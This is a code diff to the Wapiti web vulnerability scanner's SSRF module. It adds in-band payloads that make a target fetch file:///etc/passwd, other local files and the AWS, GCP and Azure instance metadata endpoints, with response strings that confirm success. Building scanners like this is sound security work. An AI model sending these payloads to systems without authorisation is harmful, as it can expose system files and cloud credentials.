@@ -33,6 +33,47 @@ from wapitiCore.net.web import http_repr
 
 SSRF_PAYLOAD = "{external_endpoint}ssrf/{random_id}/{path_id}/{hex_param}/"
 
+# In-band payloads: if the application fetches and reflects the content,
+# these patterns will appear in the HTTP response.
+SSRF_INBAND_PAYLOADS = [
+    # Linux file disclosure via file:// scheme
+    {
+        "payload": "file:///etc/passwd",
+        "rules": ["root:x:0:0", "daemon:x:"],
+    },
+    {
+        "payload": "file:///etc/networks",
+        "rules": ["loopback", "link-local"],
+    },
+    # Windows file disclosure via file:// scheme
+    {
+        "payload": "file:///c:/windows/system32/drivers/etc/networks",
+        "rules": ["loopback"],
+    },
+    # AWS EC2 instance metadata
+    {
+        "payload": "http://169.254.169.254/latest/meta-data/",
+        "rules": ["ami-id", "instance-id", "instance-type"],
+    },
+    # GCP instance metadata
+    {
+        "payload": "http://metadata.google.internal/computeMetadata/v1/",
+        "rules": ["attributes/"],
+    },
+    # Azure instance metadata
+    {
+        "payload": "http://169.254.169.254/metadata/instance?api-version=2021-02-01",
+        "rules": ["azEnvironment", "resourceGroupName"],
+    },
+]
+
+
+def _make_payload_info(payload: str, rules: Optional[list] = None) -> PayloadInfo:
+    """Build a PayloadInfo with detection rules for in-band matching."""
+    info = PayloadInfo(payload=payload)
+    info.rules = rules or []
+    return info
+
 
 class ModuleSsrf(Attack):
     """
@@ -52,22 +93,25 @@ class ModuleSsrf(Attack):
             request: Optional[Request] = None,
             parameter: Optional[Parameter] = None,
     ) -> Iterator[PayloadInfo]:
-        """Load the payloads from the specified file"""
-        # The payload will contain the parameter name in hex-encoded format
-        # If the injection is made directly in the query string (no parameter) then the payload would be
-        # the hex value of "QUERY_STRING"
+        """Generate SSRF payloads: one OOB payload for the external endpoint,
+        then in-band payloads targeting local files and cloud metadata services."""
         if parameter.situation == ParameterSituation.QUERY_STRING and parameter.name == "":
             parameter_name = "QUERY_STRING"
         else:
             parameter_name = parameter.name
 
-        payload = SSRF_PAYLOAD.format(
+        # 1) Out-of-band payload: relies on the external endpoint callback
+        oob_payload = SSRF_PAYLOAD.format(
             external_endpoint=self.external_endpoint,
             random_id=self._session_id,
             path_id=request.path_id,
             hex_param=hexlify(parameter_name.encode("utf-8", errors="replace")).decode()
         )
-        yield PayloadInfo(payload=payload)
+        yield _make_payload_info(oob_payload, rules=[])
+
+        # 2) In-band payloads: detectable via response content analysis
+        for entry in SSRF_INBAND_PAYLOADS:
+            yield _make_payload_info(entry["payload"], rules=entry["rules"])
 
     async def attack(self, request: Request, response: Optional[Response] = None):
         # Let's just send payloads, we don't care of the response as what we want to know is if the target
